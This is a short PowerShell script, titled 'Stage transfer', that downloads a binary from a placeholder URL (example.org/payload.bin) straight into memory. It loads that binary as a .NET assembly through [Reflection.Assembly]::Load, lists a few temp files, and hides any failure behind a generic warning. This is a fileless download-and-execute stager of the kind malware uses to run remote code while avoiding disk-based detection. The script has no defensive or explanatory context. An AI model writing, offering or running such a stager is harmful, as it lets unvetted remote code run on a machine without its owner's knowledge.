<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://example.org/payload.bin'
)
try { $AssemblyBytes = (New-Object System.Net.WebClient).DownloadData($FetchUrl); [Reflection.Assembly]::Load($AssemblyBytes); Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3 } catch { Write-Warning "Stage transfer failed" }
